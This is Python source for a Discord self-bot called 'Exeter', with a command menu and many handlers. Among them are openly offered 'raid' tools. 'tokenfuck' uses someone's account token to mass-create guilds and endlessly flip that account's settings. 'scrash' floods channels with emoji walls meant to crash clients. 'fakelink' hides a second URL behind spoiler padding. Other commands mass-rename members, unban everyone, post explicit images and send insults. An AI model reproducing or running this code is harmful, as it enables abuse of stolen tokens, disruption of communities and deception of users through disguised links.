emojitext - Turns text To Emojis
bigemoji - Enlarges Emoji
1337 - Hacker talk
encode - Encodes a message
decode - Decodes a message
quicdel - Quickly Deletes a message
empty - Sends empty message
---------------------------

IMAGE COMMANDS:
---------------
fry - Frys a users PFP
magik - Distort a users PFP
revav - Reverse earch a PFP
-----------------------------

RAID COMMANDS:
-------------
raid - Destroys Server
spamgcname - Spam Changes GC name
spamreact - Spam reacts
masschannel - Create Masschannels
ip - Shows information about a IP
firstmessage - Shows a servers firts message
tokenfuck - Glitch tokens screen
massunban - Unbans all banned users
servername - Rename server
scrash - Attempts to crash users where message is sent
fakelink - Fake link
setnicks - Set nicks for all users
revertnicks - Reverts nicks for all users
tokeninfo - Info of a token
everyone - Glitched way to mention everyone
------------------------------------

CRYPTO COMMANDS:
----------------
btc
eth
-----

GENERAL COMMANDS:
---------------
whois - Send user info
av - Send user Avatar
copy - Copy a guild
guildicon - Returns Server pfp
leavegc - Leaves GC
wiki - Search something on wiki
youtube - Search results for YT
tinyurl - Shortens a link
color - Get color and hex of a color



NSFW COMMANDS:
-------------
feet - Send Footjob
anal - Send anal
hentai - Send hentai
boobs - Send boobs
lesbian - Send lesbian
cumslut - Sends Cumslut
pussy - Send pussy
fuck - Fuck a user


''')


@client.command()
async def token(ctx, user: discord.Member = None):
    await ctx.message.delete()
    list = [
        "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N",
        "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "_"
        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
        'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0',
        '1', '2', '3', '4', '5', '6', '7', '8', '9'
    ]
    token = random.choices(list, k=59)
    print(token)
    if user is None:
        user = ctx.author
        await ctx.send(user.mention + "'s token is " + ''.join(token))
    else:
        await ctx.send(user.mention + "'s token is " + "".join(token))


@client.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format=format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file=discord.File(file, f"Avatar.{format}"))


@client.command()
async def whois(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    if isinstance(ctx.message.channel, discord.Guild):
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(
            name="Registered", value=user.created_at.strftime(date_format))
        em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
        members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
        em.add_field(name="Join position", value=str(members.index(user) + 1))
        if len(user.roles) > 1:
            role_string = ' '.join([r.mention for r in user.roles][1:])
            em.add_field(
                name="Roles [{}]".format(len(user.roles) - 1),
                value=role_string,
                inline=False)
        perm_string = ', '.join([
            str(p[0]).replace("_", " ").title() for p in user.guild_permissions
            if p[1]
        ])
        em.add_field(name="Permissions", value=perm_string, inline=False)
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)
    else:
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(
            name="Created", value=user.created_at.strftime(date_format))
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)

@client.command(name='1337speak', aliases=['leetspeak'])
async def _1337_speak(ctx, *, text):
    await ctx.message.delete()
    text = text.replace('a', '4').replace('A', '4').replace('e', '3') \
        .replace('E', '3').replace('i', '!').replace('I', '!') \
        .replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
    await ctx.send(f'{text}')

@client.command(aliases=['tokenfucker', 'disable', 'crash'])
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent':
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type':
        'application/json',
        'Authorization':
        _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "Exeter",
        'region': "europe"
    }
    for _i in range(50):
        requests.post(
            'https://discordapp.com/api/v6/guilds',
            headers=headers,
            json=guild)
    while True:
        try:
            request.patch(
                "https://canary.discordapp.com/api/v6/users/@me/settings",
                headers=headers,
                json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch(
                    "https://canary.discordapp.com/api/v6/users/@me/settings",
                    headers=headers,
                    json=setting,
                    timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break

@client.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):  # b'\xfc'
    await ctx.message.delete()
    await client.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in client.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass

@client.command(aliases=["purgebans", "unbanall"])
async def massunban(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass

@client.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
async def guildicon(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.icon_url)
    await ctx.send(embed=em)


@client.command(aliases=["renameserver", "nameserver"])
async def servername(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)


@client.command(aliases=["gcleave"])
async def leavegc(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        await ctx.message.channel.leave()

@client.command()
async def dog(ctx):
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    link = str(r['message'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_dog.png"))
    except:
        await ctx.send(link)


@client.command()
async def cat(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.thecatapi.com/v1/images/search").json()
    link = str(r[0]["url"])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_cat.png"))
    except:
        await ctx.send(link)

@client.command()
async def anal(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/anal")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_anal.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@client.command()
async def erofeet(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/erofeet")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_erofeet.png"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@client.command()
async def feet(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feetg")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_feet.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@client.command()
async def hentai(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_hentai.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@client.command()
async def boobs(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_boobs.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@client.command()
async def tits(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_tits.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@client.command()
async def blowjob(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_blowjob.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@client.command()
async def lesbian(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_lesbian.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@client.command()
async def cumslut(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cum")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_cumslut.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@client.command(aliases=["vagina"])
async def pussy(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pussy")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_pussy.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@client.command()
async def reverse(ctx, *, message):
    await ctx.message.delete()
    message = message[::-1]
    await ctx.send(message)


@client.command()
async def shrug(ctx):
    await ctx.message.delete()
    shrug = r'¯\_(ツ)_/¯'
    await ctx.send(shrug)


@client.command()
async def lenny(ctx):
    await ctx.message.delete()
    lenny = '( ͡° ͜ʖ ͡°)'
    await ctx.send(lenny)


@client.command(aliases=["fliptable"])
async def tableflip(ctx):
    await ctx.message.delete()
    tableflip = '(╯°□°）╯︵ ┻━┻'
    await ctx.send(tableflip)


@client.command()
async def unflip(ctx):
    await ctx.message.delete()
    unflip = '┬─┬ ノ( ゜-゜ノ)'
    await ctx.send(unflip)


@client.command()
async def bold(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('**' + message + '**')


@client.command()
async def censor(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('||' + message + '||')


@client.command()
async def underline(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('__' + message + '__')



@client.command()
async def italicize(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('*' + message + '*')


@client.command()
async def strike(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('~~' + message + '~~')


@client.command()
async def quote(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('> ' + message)


@client.command()
async def code(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('`' + message + "`")



@client.command()
async def invisnick(ctx):
    try:
        name = "‎‎‎‎‎‎‎‏‏‎ ឵឵ ឵឵ ឵឵ ឵឵‎"
        await ctx.author.edit(nick=name)
        await ctx.send(f"Now your nickname is invisible")
    except Exception as e:
        await ctx.send(f"Error: {e}")
@client.command()
async def glitchnick(ctx):

    try:
        name = "𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫" 
        await ctx.author.edit(nick=name)
        await ctx.send(f"Now your nickname is a big mess :)")
    except Exception as e:
        await ctx.send(f"Error: {e}")


@client.command(aliases=['tard'])
async def clown(ctx, arg):
    await ctx.message.delete()
    if arg == "":
        await ctx.send("specify someone to clown tard", delete_after=5)
    try:
        embed = discord.Embed(title="**you're a clown**", color=0000,
                              description=f"{arg} is a fucking clown \n lol \n ur so unfunny", timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        await ctx.send(embed=embed, delete_after=val)
    except Exception as err:
        await ctx.send(f"Error: {err}", delete_after=1)

languages = "en"


@client.command()
async def fuck(ctx, member: discord.Member=None):
    await ctx.message.delete()
    r = requests.get('https://api.neko-chxn.xyz/v1/fuck/img').json()
    embed = discord.Embed(description=f'{client.user.mention} fucks {member.mention}', color=0000, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r["url"])
    await ctx.send(embed=embed, delete_after=val)


@client.command()
async def kill(ctx, member: discord.Member=None):
    await ctx.message.delete()
    r = requests.get('https://api.neko-chxn.xyz/v1/kill/img').json()
    embed = discord.Embed(description=f'{client.user.mention} kills {member.mention}', color=0000, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r["url"])
    await ctx.send(embed=embed, delete_after=val)


@client.command()
async def clyde(ctx, *, message):
    await ctx.message.delete()
    r = requests.get(f'https://nekobot.xyz/api/imagegen?type=clyde&text={message}').json()
    embed = discord.Embed(color=0000, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r["message"])
    await ctx.send(embed=embed, delete_after=val)




@client.command()
async def trumptweet(ctx, *, message):
    await ctx.message.delete()
    r = requests.get(f'https://nekobot.xyz/api/imagegen?type=trumptweet&text={message}').json()
    embed = discord.Embed(color=0000, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r["message"])
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def scrash(ctx):
    await ctx.message.delete()
    for i in range(25):
        await ctx.send(""":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:""")
        await ctx.send(""":flag_white::flag_black::checkered_flag::triangular_flag_on_post::rainbow_flag::transgender_flag::pirate_flag::flag_af::flag_ax::flag_al::flag_dz::flag_as::flag_ao::flag_ad::flag_ai::flag_aq::flag_ag::flag_ar::flag_bb::flag_bd::flag_bh::flag_bs::flag_az::flag_at::flag_au::flag_aw::flag_am::flag_by::flag_be::flag_bz::flag_bj::flag_bm::flag_bt::flag_ba::flag_bo::flag_bw::flag_cm::flag_kh::flag_bi::flag_bf::flag_bg::flag_bn::flag_vg::flag_io::flag_br::flag_ca::flag_ic::flag_cv::flag_bq::flag_ky::flag_cf::flag_td::flag_cl::flag_cn::flag_ci::flag_cr::flag_ck::flag_cd::flag_cg::flag_km::flag_co::flag_cc::flag_cx::flag_hr::flag_cu::flag_cw::flag_cy::flag_cz::flag_dj::flag_dk::flag_dm::flag_do::flag_fk::flag_eu::flag_et::flag_ee::flag_er::flag_gq::flag_sv::flag_eg::flag_ec::flag_fo::flag_fj::flag_fi::flag_fr::flag_gf::flag_pf::flag_tf::flag_ga::flag_gm::flag_gu::flag_gp::flag_gl::flag_gd::flag_gr::flag_gi::flag_gh::flag_de::flag_ge::flag_gt::flag_gg::flag_gn::flag_gw::flag_gy::flag_ht::flag_hn::flag_hk::flag_hu::flag_it::flag_il::flag_ie:""")
        await ctx.send(""":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:""")
        await ctx.send(""":flag_white::flag_black::checkered_flag::triangular_flag_on_post::rainbow_flag::transgender_flag::pirate_flag::flag_af::flag_ax::flag_al::flag_dz::flag_as::flag_ao::flag_ad::flag_ai::flag_aq::flag_ag::flag_ar::flag_bb::flag_bd::flag_bh::flag_bs::flag_az::flag_at::flag_au::flag_aw::flag_am::flag_by::flag_be::flag_bz::flag_bj::flag_bm::flag_bt::flag_ba::flag_bo::flag_bw::flag_cm::flag_kh::flag_bi::flag_bf::flag_bg::flag_bn::flag_vg::flag_io::flag_br::flag_ca::flag_ic::flag_cv::flag_bq::flag_ky::flag_cf::flag_td::flag_cl::flag_cn::flag_ci::flag_cr::flag_ck::flag_cd::flag_cg::flag_km::flag_co::flag_cc::flag_cx::flag_hr::flag_cu::flag_cw::flag_cy::flag_cz::flag_dj::flag_dk::flag_dm::flag_do::flag_fk::flag_eu::flag_et::flag_ee::flag_er::flag_gq::flag_sv::flag_eg::flag_ec::flag_fo::flag_fj::flag_fi::flag_fr::flag_gf::flag_pf::flag_tf::flag_ga::flag_gm::flag_gu::flag_gp::flag_gl::flag_gd::flag_gr::flag_gi::flag_gh::flag_de::flag_ge::flag_gt::flag_gg::flag_gn::flag_gw::flag_gy::flag_ht::flag_hn::flag_hk::flag_hu::flag_it::flag_il::flag_ie:""")
        await ctx.send(""":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:""")
        await ctx.send(""":flag_white::flag_black::checkered_flag::triangular_flag_on_post::rainbow_flag::transgender_flag::pirate_flag::flag_af::flag_ax::flag_al::flag_dz::flag_as::flag_ao::flag_ad::flag_ai::flag_aq::flag_ag::flag_ar::flag_bb::flag_bd::flag_bh::flag_bs::flag_az::flag_at::flag_au::flag_aw::flag_am::flag_by::flag_be::flag_bz::flag_bj::flag_bm::flag_bt::flag_ba::flag_bo::flag_bw::flag_cm::flag_kh::flag_bi::flag_bf::flag_bg::flag_bn::flag_vg::flag_io::flag_br::flag_ca::flag_ic::flag_cv::flag_bq::flag_ky::flag_cf::flag_td::flag_cl::flag_cn::flag_ci::flag_cr::flag_ck::flag_cd::flag_cg::flag_km::flag_co::flag_cc::flag_cx::flag_hr::flag_cu::flag_cw::flag_cy::flag_cz::flag_dj::flag_dk::flag_dm::flag_do::flag_fk::flag_eu::flag_et::flag_ee::flag_er::flag_gq::flag_sv::flag_eg::flag_ec::flag_fo::flag_fj::flag_fi::flag_fr::flag_gf::flag_pf::flag_tf::flag_ga::flag_gm::flag_gu::flag_gp::flag_gl::flag_gd::flag_gr::flag_gi::flag_gh::flag_de::flag_ge::flag_gt::flag_gg::flag_gn::flag_gw::flag_gy::flag_ht::flag_hn::flag_hk::flag_hu::flag_it::flag_il::flag_ie:""")


@client.command()
async def wiki(ctx, *, message):
    await ctx.message.delete()
    try:
        try:
            await ctx.send(wikipedia.summary(message, sentences=2))
        except UserWarning:
            pass
    except Exception as e:
        await ctx.send(e)


@client.command()
async def youtube(ctx, *, arg):
    await ctx.message.delete()
    results = YoutubeSearch(arg, max_results=10).to_dict()
    rt = ''
    for i in range(10):
        rt += f'{results[i]["channel"]} - {results[i]["title"]} ({results[i]["duration"]})\n'
    embed = discord.Embed(title=f'**Top 10 results for {arg}**', description=rt, color=0000, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=val)


@client.command()
async def phcomment(ctx, user, *, message):
    await ctx.message.delete()
    r = requests.get(f'https://nekobot.xyz/api/imagegen?type=phcomment&text={message}&username={user}&image=https://i.imgur.com/raRKTgZ.jpg').json()
    embed = discord.Embed(color=0000, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r["message"])
    await ctx.send(embed=embed, delete_after=val)


@client.command()
async def fakelink(ctx, link1, link2):
    await ctx.message.delete()
    await ctx.send(link1 + ' ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| ' + link2)

@client.command()
async def encode(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(base64.b64encode(bytes(message, 'utf-8')).decode())

@client.command()
async def decode(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(base64.b64decode(bytes(message, 'utf-8')).decode())

@client.command()
async def setnicks(ctx, *, message):
    await ctx.message.delete()
    for member in ctx.message.guild.members:
        try:
            await member.edit(nick=message)
        except Exception as e:
            print(e)

@client.command()
async def revertnicks(ctx):
    await ctx.message.delete()
    for member in ctx.message.guild.members:
        try:
            await member.edit(nick=None)
        except:
            pass

@client.command()
async def spank(ctx, member: discord.Member=None):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/spank').json()
    embed = discord.Embed(description=f"{client.user.mention} spanks {member.mention}", color=0000, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=r['url'])
    await ctx.send(embed=embed, delete_after=val)


@client.command()
async def id(ctx, member: discord.Member=None):
    await ctx.message.delete()
    if not member:
        pass
    try:
        embed = discord.Embed(description=f"**{member.mention}'s ID**\n\n{member.id}",color=0000, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        await ctx.send(embed=embed, delete_after=val)
    except:
        await ctx.send(f"{member}'s ID" + '\n' + str(member.id), delete_after=val)


@client.command()
async def joke(ctx):
    await ctx.message.delete()
    r = requests.get("https://sv443.net/jokeapi/v2/joke/Any?type=single")
    embed = discord.Embed(title="**Joke**", color=0000, description=f"{r.json()['joke']}", timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=val)


@client.command(aliases=['fakedox', 'dox'])
async def userdox(ctx, member : discord.Member=None):
    await ctx.message.delete()
    embed = discord.Embed(title=f"{member}", color=0000, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.add_field(name='**Token**', value=f"{base64.b64encode(bytes(str(member.id), 'utf-8')).decode() + '...'}", inline=False)
    await ctx.send(embed=embed, delete_after=val)

languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}
locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

@client.command(aliases=['ri', 'role'])
async def roleinfo(ctx, *, role: discord.Role): # b'\xfc'
    await ctx.message.delete()
    guild = ctx.guild
    since_created = (ctx.message.created_at - role.created_at).days
    role_created = role.created_at.strftime("%d %b %Y %H:%M")
    created_on = "{} ({} days ago)".format(role_created, since_created)
    users = len([x for x in guild.members if role in x.roles])
    if str(role.colour) == "#000000":
        colour = "default"
        color = ("#%06x" % random.randint(0, 0xFFFFFF))
        color = int(colour[1:], 16)
    else:
        colour = str(role.colour).upper()
        color = role.colour
    em = discord.Embed(colour=color)
    em.set_author(name=f"Name: {role.name}"
    f"\nRole ID: {role.id}")
    em.add_field(name="Users", value=users)
    em.add_field(name="Mentionable", value=role.mentionable)
    em.add_field(name="Hoist", value=role.hoist)
    em.add_field(name="Position", value=role.position)
    em.add_field(name="Managed", value=role.managed)
    em.add_field(name="Colour", value=colour)
    em.add_field(name='Creation Date', value=created_on)
    await ctx.send(embed=em)
    print("[!] Command used: ri")


